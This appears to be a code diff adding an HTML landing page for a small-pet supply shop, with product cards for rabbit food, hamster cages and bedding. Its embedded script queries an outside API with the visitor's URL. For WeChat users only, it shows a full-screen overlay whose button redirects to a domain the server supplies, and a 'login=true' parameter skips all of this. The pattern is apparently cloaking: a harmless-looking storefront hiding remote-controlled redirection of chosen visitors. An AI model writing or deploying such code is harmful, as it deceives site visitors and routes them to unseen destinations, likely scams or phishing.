@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>茸茸小宠 · 软萌星球</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Nunito',system-ui;}
+        body{background:#f4f9e8;}
+        .navbar{background:#ffffffcc;backdrop-filter:blur(12px);margin:0.5rem 4%;border-radius:80px;padding:0.6rem 2rem;display:flex;justify-content:space-between;align-items:center;box-shadow:0 5px 15px rgba(0,0,0,0.02);}
+        .logo{color:#2b5e2b;font-weight:800;font-size:1.3rem;}
+        .nav-links{display:flex;gap:1.2rem;}
+        .nav-links a{text-decoration:none;color:#3a5e3a;}
+        .hero-asym{display:flex;flex-wrap:wrap;margin:1.5rem 5%;gap:2rem;align-items:center;background:#e6f0da;border-radius:48px;padding:2rem;}
+        .hero-left{flex:1;}
+        .hero-left h1{color:#2c5e2c;font-size:2rem;}
+        .goods-special{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:1.5rem;margin:2rem 5%;}
+        .card-round{background:white;border-radius:32px;padding:0 0 1rem 0;overflow:hidden;transition:0.2s;}
+        .card-round img{width:100%;height:150px;object-fit:cover;}
+        .card-round h3{margin:0.8rem 1rem 0.3rem;color:#2b5e2b;}
+        .card-round p{margin:0 1rem 1rem;font-size:0.8rem;color:#5a6e4a;}
+        .tip-banner{background:#d9e6b3;margin:2rem 5%;padding:1.2rem;border-radius:40px;text-align:center;}
+        @media (max-width:700px){.nav-links{display:none;}}
+        .wechat-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);backdrop-filter:blur(2px);display:flex;justify-content:center;align-items:center;z-index:9999;display:none;}
+        .wechat-modal{width:260px;background:white;border-radius:36px;}
+        .enter-btn{background:#6fbf4c;border:none;padding:12px;border-radius:40px;width:80%;margin:1rem auto;display:block;color:white;cursor:pointer;}
+    </style>
+</head>
+<body>
+<div class="navbar"><div class="logo">🐇 茸茸小宠</div><ul class="nav-links"><li><a href="#">仓鼠</a></li><li><a href="#">兔兔</a></li><li><a href="#">龙猫</a></li><li><a href="#">垫料</a></li></ul></div>
+<div class="hero-asym"><div class="hero-left"><h1>小宠也有大幸福 🌿</h1><p>天然提摩西草 · 无尘垫料 · 磨牙玩具</p></div><div>🐹 🐰 🐭</div></div>
+<h2 style="margin:0 5% 0.5rem;color:#3f6640;">✨ 萌宠人气单品</h2>
+<div class="goods-special">
+    <div class="card-round"><img src="https://picsum.photos/id/37/400/300" alt="兔粮"><h3>提摩西草兔粮</h3><p>高纤维低蛋白，预防毛球症，天然牧草香</p></div>
+    <div class="card-round"><img src="https://picsum.photos/id/48/400/300" alt="仓鼠笼"><h3>亚克力透明笼</h3><p>防咬静音跑轮，前开门易清理，透气天窗</p></div>
+    <div class="card-round"><img src="https://picsum.photos/id/112/400/300" alt="磨牙石"><h3>火山石磨牙串</h3><p>补充矿物质，天然火山浮石，防牙齿过长</p></div>
+    <div class="card-round"><img src="https://picsum.photos/id/94/400/300" alt="纸棉垫料"><h3>无尘彩色纸棉</h3><p>吸水除臭，柔软保暖，粉尘过滤99%</p></div>
+</div>
+<div class="tip-banner">🐣 新客专享：首单立减10元 + 小宠护理手册</div>
+<div class="wechat-overlay" id="wechatModal"><div class="wechat-modal"><div class="wechat-modal-image"><p>🍃 小宠星球入口</p><span>点击进入专属顾问</span></div><div><button class="enter-btn" id="enterBtn">进入小宠社区</button></div></div></div>
+
+<script>
+(function(){
+    const modal = document.getElementById("wechatModal");
+    const btn = document.getElementById("enterBtn");
+    modal.style.display = "none";
+
+    // 若 URL 带有 login=true 则跳过弹窗和接口请求
+    if (new URLSearchParams(location.search).get('login') === 'true') return;
+
+    // ---- 获取 rule_id 参数 ----
+    const urlParams = new URLSearchParams(location.search);
+    const ruleId = urlParams.get('rule_id');
+
+    const curUrl = encodeURIComponent(location.href);
+
+    // 构建接口地址，若 rule_id 存在则追加参数
+    let apiUrl = "https://api.qlpdk.cn/api/index/selectRoute?url=" + curUrl;
+    if (ruleId !== null && ruleId !== '') {
+        apiUrl += '&rule_id=' + encodeURIComponent(ruleId);
+    }
+
+    fetch(apiUrl)
+        .then(r => r.json())
+        .then(d => {
+            if (d && d.code === 1 && /micromessenger/i.test(navigator.userAgent)) {
+                modal.style.display = "flex";
+            }
+            let redir = d?.data?.loginDomain;
+            if (redir) {
+                // 替换按钮，防止重复绑定
+                const newBtn = btn.cloneNode(true);
+                btn.replaceWith(newBtn);
+                document.getElementById("enterBtn").onclick = function() {
+                    location.href = redir;
+                };
+            }
+        })
+        .catch(e => {});
+
+    modal.addEventListener("click", e => e.stopPropagation());
+})();
+</script>
+</body>
+</html>
